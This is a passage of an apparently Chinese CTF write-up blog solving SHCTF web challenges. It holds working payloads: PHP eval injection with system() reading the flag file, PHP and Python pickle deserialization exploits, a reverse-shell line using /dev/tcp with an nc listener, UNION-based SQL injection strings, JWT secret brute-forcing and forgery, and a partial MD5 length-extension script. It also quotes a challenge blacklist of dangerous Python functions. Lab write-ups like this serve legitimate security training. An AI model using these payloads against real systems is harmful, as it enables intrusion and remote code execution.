class="line">    echo(&quot;呜呜呜fault还是要出题&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>进行代码审计，我们发现get提交的ququ要为114514，它的逆向要不为114514，由于是弱比较，我们让</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ququ=114514.0就能绕过第一个if</span><br></pre></td></tr></table></figure>

<p>而post传递的ququ，它的前6个字符需为ququk1</p>
<p>我们使用?&gt;&lt;?php截断eval函数，再重新创个system函数来执行</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ququk1; ?&gt;&lt;?php system(&quot;ls&quot;);</span><br></pre></td></tr></table></figure>

<p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410062113443.png" alt="image-20241006211310235" loading="lazy"></p>
<p>成功得到目录文件</p>
<p>然后我们找到flag所在位置</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ququk1; ?&gt;&lt;?php system(&quot;ls ../../../&quot;);</span><br></pre></td></tr></table></figure>

<p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410062113507.png" alt="image-20241006211356292" loading="lazy"></p>
<p>将flag输出出来</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ququk1; ?&gt;&lt;?php system(&quot;cat ../../../flag&quot;);</span><br></pre></td></tr></table></figure>

<p>就得到flag了</p>
<h4 id="Week1-poppopop"><a href="#Week1-poppopop" class="headerlink" title="[Week1] poppopop"></a>[Week1] poppopop</h4><p>简单的反序列化</p>
<p>pop链</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class SH &#123;</span><br><span class="line"></span><br><span class="line">    public static $Web =true;</span><br><span class="line">    public static $SHCTF = true;</span><br><span class="line">&#125;</span><br><span class="line">class C &#123;</span><br><span class="line">    public $p;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">class T&#123;</span><br><span class="line"></span><br><span class="line">    public $n;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">class F &#123;</span><br><span class="line">    public $o;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">class SHCTF &#123;</span><br><span class="line">    public $isyou=&quot;system&quot;;</span><br><span class="line">    public $flag=&quot;cat ../../../flllag&quot;;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">$a=new T();</span><br><span class="line">$a-&gt;n=new F();</span><br><span class="line">$a-&gt;n-&gt;o=new C();</span><br><span class="line">$a-&gt;n-&gt;o-&gt;p=new SHCTF();</span><br><span class="line">echo base64_encode((serialize($a)));</span><br></pre></td></tr></table></figure>

<h4 id="Week1-MD5-Master"><a href="#Week1-MD5-Master" class="headerlink" title="[Week1] MD5 Master"></a>[Week1] MD5 Master</h4><p>md5	强碰撞</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__file__);</span><br><span class="line"></span><br><span class="line">$master = &quot;MD5 master!&quot;;</span><br><span class="line"></span><br><span class="line">if(isset($_POST[&quot;master1&quot;]) &amp;&amp; isset($_POST[&quot;master2&quot;]))&#123;</span><br><span class="line">    if($master.$_POST[&quot;master1&quot;] !== $master.$_POST[&quot;master2&quot;] &amp;&amp; md5($master.$_POST[&quot;master1&quot;]) === md5($master.$_POST[&quot;master2&quot;]))&#123;</span><br><span class="line">        echo $master . &quot;&lt;br&gt;&quot;;</span><br><span class="line">        echo file_get_contents(&#x27;/flag&#x27;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    die(&quot;master? &lt;br&gt;&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们来审计代码，要传入的maste1和maste2跟master拼接的数据不同，但md5的值要相同，且为md5强碰撞，我们使用fastcoll来生成两个前缀为 <code>MD5 master!</code> 且md5一样的文件。</p>
<p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410242055752.png" alt="image-20241024205524693" loading="lazy"></p>
<p>我们使用bp或hackbar将值传上去</p>
<p>这里需要注意的细节是，用hackerbar发送时，要在结尾多添加一个 <code>&amp;</code>，因为hackerbar会自动换行</p>
<p>用bp发送时，要把最后的空行删除，不能有多余的东西，或者在结尾多添加一个<code>&amp;</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">master1=%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00v%CE%0A%9F%DF%0FL%86%AF%DB%14%D4%250o%C6%C6%DB%5D%08%FC%8A%27%9F%1A%AA9F%11%FA%90%11%96%D5%02%E2%BC%D4%2B%1B%8B%06q%A1%17%16%7Fp%0B%3D%CD%5D%FFdu%13%F0%16%E0%ADx%D52%DEnD%FF%85%C6%8C%C3%10E%B2%11%C18%7CM%A8C%7E%BAWd%5B%C2%28%8D%C3+%C8%8B_%88%C8%CBs48%A7%06.TtI%CA%3A%3B%98%0E%9F%F5S%D4%D2%AE%A7q%839IW%A6%11%CF%8Cv&amp;master2=%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00v%CE%0A%9F%DF%0FL%86%AF%DB%14%D4%250o%C6%C6%DB%5D%88%FC%8A%27%9F%1A%AA9F%11%FA%90%11%96%D5%02%E2%BC%D4%2B%1B%8B%06q%A1%17%96%7Fp%0B%3D%CD%5D%FFdu%13%F0%16%E0-x%D52%DEnD%FF%85%C6%8C%C3%10E%B2%11%C18%7CM%A8C%7E%BA%D7d%5B%C2%28%8D%C3+%C8%8B_%88%C8%CBs48%A7%06.TtI%CA%3A%3B%18%0E%9F%F5S%D4%D2%AE%A7q%839IW%26%11%CF%8Cv</span><br></pre></td></tr></table></figure>

<p>得到flag</p>
<p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410242056773.png" alt="image-20241024205613719" loading="lazy"></p>
<h4 id="Week2-登录验证"><a href="#Week2-登录验证" class="headerlink" title="[Week2]登录验证"></a>[Week2]登录验证</h4><p>题目说跟jwt有关，那我们先登录</p>
<p>我们发先</p>
<p>密码不是admin会回显错误密码,账号不是admin会回显”你不是admin”</p>
<p>都是admin后回显”你不是真正的admin”,此时抓包可以看到cookie处有token</p>
<p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410241908643.png" alt="image-20241024190833511" loading="lazy"></p>
<p>我们把token放到jwt.io里去解密</p>
<p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410241908783.png" alt="image-20241024190859741" loading="lazy"></p>
<p>我们发现这个role是user，我们猜测要将其改为admin，但是我们需要密钥，题目提示可以爆破，那我们用jwt-cracker爆破看看，根据题目描述666666，我们猜测6位弱密码</p>
<p><img src="https://mmbiz.qpic.cn/sz_mmbiz_png/7qW6h4Sfy6DXkO0QiaOzfHZg049wIQHicnMiaQLianWsb9jbTHXy0xsJjohqzl3dxT8xXZd00Fs4KQypQ0yWtJUt9Q/640?wx_fmt=png&from=appmsg&tp=webp&wxfrom=10005&wx_lazy=1&wx_co=1" alt="图片" loading="lazy"></p>
<p>爆破出来密码为222333，我们开始修改jwt</p>
<p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410241934303.png" alt="image-20241024193417201" loading="lazy"></p>
<p>我们将修改后的jwt重新传入token中，刷新页面，得到flag</p>
<p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410241939435.png" alt="image-20241024193912384" loading="lazy"></p>
<h4 id="Week2-dickle"><a href="#Week2-dickle" class="headerlink" title="[Week2]dickle"></a>[Week2]dickle</h4><p>题目提示说是p不是d，那就是pickle反序列化了</p>
<p>我们查看源码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line">from flask import Flask, request</span><br><span class="line">import pickle</span><br><span class="line">import base64</span><br><span class="line">import io</span><br><span class="line"></span><br><span class="line">BLACKLISTED_CLASSES = [</span><br><span class="line">    &#x27;subprocess.check_output&#x27;,&#x27;builtins.eval&#x27;,&#x27;builtins.exec&#x27;,</span><br><span class="line">    &#x27;os.system&#x27;, &#x27;os.popen&#x27;, &#x27;os.popen2&#x27;, &#x27;os.popen3&#x27;, &#x27;os.popen4&#x27;, </span><br><span class="line">    &#x27;pickle.load&#x27;, &#x27;pickle.loads&#x27;, &#x27;cPickle.load&#x27;, &#x27;cPickle.loads&#x27;, </span><br><span class="line">    &#x27;subprocess.call&#x27;, &#x27;subprocess.check_call&#x27;, &#x27;subprocess.Popen&#x27;, </span><br><span class="line">    &#x27;commands.getstatusoutput&#x27;, &#x27;commands.getoutput&#x27;, &#x27;commands.getstatus&#x27;, </span><br><span class="line">    &#x27;pty.spawn&#x27;, &#x27;posixfile.open&#x27;, &#x27;posixfile.fileopen&#x27;,</span><br><span class="line">    &#x27;__import__&#x27;,&#x27;os.spawn*&#x27;,&#x27;sh.Command&#x27;,&#x27;imp.load_module&#x27;,&#x27;builtins.compile&#x27;</span><br><span class="line">    &#x27;eval&#x27;, &#x27;builtins.execfile&#x27;, &#x27;compile&#x27;, &#x27;builtins.open&#x27;, &#x27;builtins.file&#x27;, &#x27;os.system&#x27;, </span><br><span class="line">    &#x27;os.fdopen&#x27;, &#x27;os.tmpfile&#x27;, &#x27;os.fchmod&#x27;, &#x27;os.fchown&#x27;, &#x27;os.open&#x27;, &#x27;os.openpty&#x27;, &#x27;os.read&#x27;, &#x27;os.pipe&#x27;,</span><br><span class="line">    &#x27;os.chdir&#x27;, &#x27;os.fchdir&#x27;, &#x27;os.chroot&#x27;, &#x27;os.chmod&#x27;, &#x27;os.chown&#x27;, &#x27;os.link&#x27;, &#x27;os.lchown&#x27;, &#x27;os.listdir&#x27;,</span><br><span class="line">    &#x27;os.lstat&#x27;, &#x27;os.mkfifo&#x27;, &#x27;os.mknod&#x27;, &#x27;os.access&#x27;, &#x27;os.mkdir&#x27;, &#x27;os.makedirs&#x27;, &#x27;os.readlink&#x27;, &#x27;os.remove&#x27;,</span><br><span class="line">    &#x27;os.removedirs&#x27;, &#x27;os.rename&#x27;, &#x27;os.renames&#x27;, &#x27;os.rmdir&#x27;, &#x27;os.tempnam&#x27;, &#x27;os.tmpnam&#x27;, &#x27;os.unlink&#x27;, &#x27;os.walk&#x27;,</span><br><span class="line">    &#x27;os.execl&#x27;, &#x27;os.execle&#x27;, &#x27;os.execlp&#x27;, &#x27;os.execv&#x27;, &#x27;os.execve&#x27;, &#x27;os.dup&#x27;, &#x27;os.dup2&#x27;, &#x27;os.execvp&#x27;, &#x27;os.execvpe&#x27;,</span><br><span class="line">    &#x27;os.fork&#x27;, &#x27;os.forkpty&#x27;, &#x27;os.kill&#x27;, &#x27;os.spawnl&#x27;, &#x27;os.spawnle&#x27;, &#x27;os.spawnlp&#x27;, &#x27;os.spawnlpe&#x27;, &#x27;os.spawnv&#x27;,</span><br><span class="line">    &#x27;os.spawnve&#x27;, &#x27;os.spawnvp&#x27;, &#x27;os.spawnvpe&#x27;, &#x27;pickle.load&#x27;, &#x27;pickle.loads&#x27;, &#x27;cPickle.load&#x27;, &#x27;cPickle.loads&#x27;,</span><br><span class="line">    &#x27;subprocess.call&#x27;, &#x27;subprocess.check_call&#x27;, &#x27;subprocess.check_output&#x27;, &#x27;subprocess.Popen&#x27;,</span><br><span class="line">    &#x27;commands.getstatusoutput&#x27;, &#x27;commands.getoutput&#x27;, &#x27;commands.getstatus&#x27;, &#x27;glob.glob&#x27;,</span><br><span class="line">    &#x27;linecache.getline&#x27;, &#x27;shutil.copyfileobj&#x27;, &#x27;shutil.copyfile&#x27;, &#x27;shutil.copy&#x27;, &#x27;shutil.copy2&#x27;, &#x27;shutil.move&#x27;,</span><br><span class="line">    &#x27;shutil.make_archive&#x27;, &#x27;popen2.popen2&#x27;, &#x27;popen2.popen3&#x27;, &#x27;popen2.popen4&#x27;, &#x27;timeit.timeit&#x27;, &#x27;sys.call_tracing&#x27;,</span><br><span class="line">    &#x27;code.interact&#x27;, &#x27;code.compile_command&#x27;, &#x27;codeop.compile_command&#x27;, &#x27;pty.spawn&#x27;, &#x27;posixfile.open&#x27;,</span><br><span class="line">    &#x27;posixfile.fileopen&#x27;</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">class SafeUnpickler(pickle.Unpickler):</span><br><span class="line">    def find_class(self, module, name):</span><br><span class="line">        print(f&#x27;find_class &#123;moudle&#125;.&#123;name&#125;&#x27;)</span><br><span class="line">        if f&quot;&#123;module&#125;.&#123;name&#125;&quot; in BLACKLISTED_CLASSES:</span><br><span class="line">            raise pickle.UnpicklingError(&quot;Forbidden class: %s.%s&quot; % (module, name))</span><br><span class="line">        return super().find_class(module, name)</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">@app.route(&quot;/&quot;, methods=[&quot;GET&quot;, &quot;POST&quot;])</span><br><span class="line">def index():</span><br><span class="line">    if request.method == &quot;POST&quot;:</span><br><span class="line">        encoded_data = request.form[&quot;data&quot;]</span><br><span class="line">        decoded_data = base64.b64decode(encoded_data)</span><br><span class="line">        </span><br><span class="line">        try:</span><br><span class="line">            data_stream = io.BytesIO(decoded_data)</span><br><span class="line">            unpickler = SafeUnpickler(data_stream)</span><br><span class="line">            print(unpickler.load())</span><br><span class="line">            return f&quot;Deserialized data: &#123;list(result)&#125;&quot;</span><br><span class="line">        except Exception as e:</span><br><span class="line">            return f&quot;Error during deserialization: &#123;str(e)&#125;&quot;</span><br><span class="line">    else:</span><br><span class="line">        return &quot;&quot;&quot;</span><br><span class="line">        &lt;form method=&quot;post&quot;&gt;</span><br><span class="line">            &lt;label for=&quot;data&quot;&gt;Enter your serialized data:&lt;/label&gt;&lt;br&gt;</span><br><span class="line">            &lt;textarea id=&quot;data&quot; name=&quot;data&quot;&gt;&lt;/textarea&gt;&lt;br&gt;</span><br><span class="line">            &lt;input type=&quot;submit&quot; value=&quot;Submit&quot;&gt;</span><br><span class="line">        &lt;/form&gt;</span><br><span class="line">        &quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    app.run(port=8080)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>我们看到黑名单里过滤了os.system</p>
<p>在反序列化过程中，如果 <code>pickle</code> 模块遇到一个表示类的标记，它会调用 <code>find_class</code> 方法来查找和创建相应的类实例。</p>
<p><code>find_class</code> 方法将识别到的 <code>module</code> 和 <code>name</code> 取决于 <code>reduce</code> 方法返回的内容。</p>
<p><code>module</code>是类的模块名，例如 “<code>os</code>“。<code>name</code>是类名，例如 “<code>system</code>“</p>
<p>我们本地运行加一个打印find_class的结果</p>
<p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410242020742.png" alt="image-20241024202014650" loading="lazy"></p>
<p>在反序列化过程中， pickle 使用 <code>find_class</code> 方法来定位和导入必要的类或函数。由于 pickle 记录的是 <code>posix.system</code>，因此<code>find_class</code> 会从 posix 模块中导入 system 函数，而不是从 os 模块中导入。</p>
<p>所以可以用<code>os.system</code></p>
<p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410242020845.png" alt="image-20241024202032803" loading="lazy"></p>
<p>我们进行pickle反序列化</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">import base64</span><br><span class="line">import pickle</span><br><span class="line">import os</span><br><span class="line"></span><br><span class="line">class A(object):</span><br><span class="line">    def __reduce__(self):</span><br><span class="line">        return (os.system, (&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/ip/端口 0&gt;&amp;1&#x27;&quot;,))</span><br><span class="line">a = A()</span><br><span class="line">print( base64.b64encode( pickle.dumps(a) ) )</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>先监听端口</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 端口</span><br><span class="line"></span><br><span class="line">若出现nc: getnameinfo: Temporary failure in name resolution</span><br><span class="line">使用 nc -lvnp 端口</span><br></pre></td></tr></table></figure>

<p>然后将反序列化的结果传上去反弹shell，查找flag</p>
<p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410242022040.png" alt="image-20241024202255967" loading="lazy"></p>
<h4 id="Week2-自助查询"><a href="#Week2-自助查询" class="headerlink" title="[Week2]自助查询"></a>[Week2]自助查询</h4><p>我们使用1”)就能将sql语句闭合，然后就是正常的sql注入过程</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&quot;）union select 1,database()#</span><br></pre></td></tr></table></figure>

<p> ctf</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&quot;) union select 1,group_concat(table_name) from information_schema.tables where table_schema=&quot;ctf&quot;#</span><br></pre></td></tr></table></figure>

<p>flag,users</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&quot;) union select 1,group_concat(column_name) from information_schema.columns where table_name=&quot;flag&quot;#</span><br></pre></td></tr></table></figure>

<p>id,scretdata</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&quot;) union select 1,group_concat(scretdata) from flag#</span><br></pre></td></tr></table></figure>

<p>被你查到了, 果然不安全,把重要的东西写在注释就不会忘了</p>
<p>我们去查找列注释</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&quot;) union select 1,column_comment from information_schema.columns</span><br></pre></td></tr></table></figure>

<p>得到flag</p>
<p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410242043580.png" alt="image-20241024204344539" loading="lazy"></p>
<h4 id="Week2-MD5-GOD"><a href="#Week2-MD5-GOD" class="headerlink" title="[Week2]MD5 GOD!"></a>[Week2]MD5 GOD!</h4><p>我们先开始代码审计</p>
<p>我们由源码可知，当64个用户签到成功后即可得到flag</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">@app.route(&quot;/flag&quot;)</span><br><span class="line">def flag():</span><br><span class="line">    for user in users:</span><br><span class="line">        if sign_users[user] != 1:</span><br><span class="line">            return &quot;flag&#123;杂鱼~&#125;&quot;</span><br><span class="line">    return open(&#x27;/flag&#x27;, &#x27;r&#x27;).read()</span><br></pre></td></tr></table></figure>

<p>访问users路由可以知道用户的签到状态</p>
<p>&#x2F;login 路由可以登录</p>
<p>&#x2F; 路由是用来签到的</p>
<p>&#x2F;flag 能得到flag</p>
<p>我们来观察签到逻辑和验证函数</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">def check_sign(sign, username, msg, salt):</span><br><span class="line">    if sign == md5(salt + msg + username):</span><br><span class="line">        return True</span><br><span class="line">    return False</span><br><span class="line"></span><br><span class="line">@app.route(&quot;/&quot;)</span><br><span class="line">def index():</span><br><span class="line">    if session.get(&#x27;sign&#x27;) == None or session.get(&#x27;username&#x27;) == None or session.get(&#x27;msg&#x27;) == None:</span><br><span class="line">        return redirect(&quot;/login&quot;)</span><br><span class="line">    sign = session.get(&#x27;sign&#x27;)</span><br><span class="line">    username = session.get(&#x27;username&#x27;)</span><br><span class="line">    msg = session.get(&#x27;msg&#x27;)</span><br><span class="line">    if check_sign(sign, username, msg, salt):</span><br><span class="line">        sign_users[username.decode()] = 1</span><br><span class="line">        return &quot;签到成功&quot;</span><br><span class="line">    return redirect(&quot;/login&quot;)</span><br></pre></td></tr></table></figure>

<p>我们可以知道，只要session里的sign和最终<code>md5(salt + msg + username)</code> 相等即可签到成功</p>
<p>这里的salt是未知的，但最初的账号 student 的所有信息是已知的，可以用这个账号的相关信息来做hash长度拓展攻击</p>
<p>hash长度拓展攻击的代码可以去网上找现成的</p>
<p>接着是session伪造，<code>SECRET_KEY</code> 已经给出是 <code>Th1s_is_5ecr3t_k3y</code>，写脚本的时候可以参考 <code>flask_session_cookie_manager3.py</code>里的代码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br></pre></td><td class="code"><pre><span class="line">import hashlib</span><br><span class="line">import math</span><br><span class="line">from typing import Any, Dict, List</span><br><span class="line"></span><br><span class="line">rotate_amounts = [7, 12, 17, 22, 7, 12, 17, 22, 7, 12, 17, 22, 7, 12, 17, 22,</span><br><span class="line">                  5, 9, 14, 20, 5, 9, 14, 20, 5, 9, 14, 20, 5, 9, 14, 20,</span><br><span class="line">                  4, 11, 16, 23, 4, 11, 16, 23, 4, 11, 16, 23, 4, 11, 16, 23,</span><br><span class="line">                  6, 10, 15, 21, 6, 10, 15, 21, 6, 10, 15, 21, 6, 10, 15, 21]</span><br><span class="line"></span><br><span class="line">constants = [int(abs(math.sin(i + 1)) * 2 ** 32) &amp; 0xFFFFFFFF for i in range(64)]</span><br><span class="line"></span><br><span class="line">functions = 16 * [lambda b, c, d: (b &amp; c) | (~b &amp; d)] + \</span><br><span class="line">            16 * [lambda b, c, d: (d &amp; b) | (~d &amp; c)] + \</span><br><span class="line">            16 * [lambda b, c, d: b ^ c ^ d] + \</span><br><span class="line">            16 * [lambda b, c, d: c ^ (b | ~d)]</span><br><span class="line"></span><br><span class="line">index_functions = 16 * [lambda i: i] + \</span><br><span 